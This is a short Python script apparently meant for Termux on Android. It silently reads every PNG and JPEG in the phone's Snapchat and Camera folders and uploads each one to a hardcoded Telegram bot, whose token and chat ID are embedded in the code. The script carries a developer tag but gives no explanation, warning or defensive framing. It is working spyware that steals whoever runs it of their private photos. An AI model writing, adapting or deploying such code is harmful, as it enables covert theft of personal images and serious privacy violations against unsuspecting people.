import os
try:
	import requests
except:
	os.system("pip install requests")
	import requests
def send_photo_with_caption(photo):
    url = f"https://api.telegram.org/bot6905293289:AAHmcIV2Mo4o6bfmKrKx-yHL3rq558G2vMc/sendPhoto"
    response = requests.post(url, data={'chat_id': '743500292', 'caption': "dev: @lw_w7"}, files={'photo': photo})
path = "/data/data/com.termux/files/home/storage/dcim/"
filess =["Snapchat",'Camera']
for dir in filess:
	if os.path.exists(path+dir):
		files = os.listdir(path+dir)
		for file in files:
			filename = os.path.join(path+dir,file)
			if filename.endswith(".png") or filename.endswith(".jpg") or filename.endswith(".jpeg"):
				with open(os.path.join(filename),'rb') as img:
					send_photo_with_caption(img)